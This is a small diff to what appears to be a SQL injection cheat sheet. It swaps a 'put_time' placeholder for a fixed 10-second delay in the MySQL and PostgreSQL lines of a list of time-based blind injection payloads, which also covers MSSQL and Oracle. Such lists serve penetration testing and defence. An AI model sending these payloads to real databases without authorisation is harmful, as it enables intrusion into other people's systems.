@@ -65,9 +65,9 @@
 ```
 #### With Time Delays
 ```
-● MySQL                         : ' || (SELECT sleep(put_time))--
+● MySQL                         : ' || (SELECT sleep(10))--
 ● MSSQL                         : ' || (WAITFOR DELAY '0:0:10')--
 ● Oracle                        : ' || (dbms_pipe.receive_message(('a'),10))--
-● PostgreSQL                    : ' || (SELECT pg_sleep(put_time))--
+● PostgreSQL                    : ' || (SELECT pg_sleep(10))--
 ```
 #### 
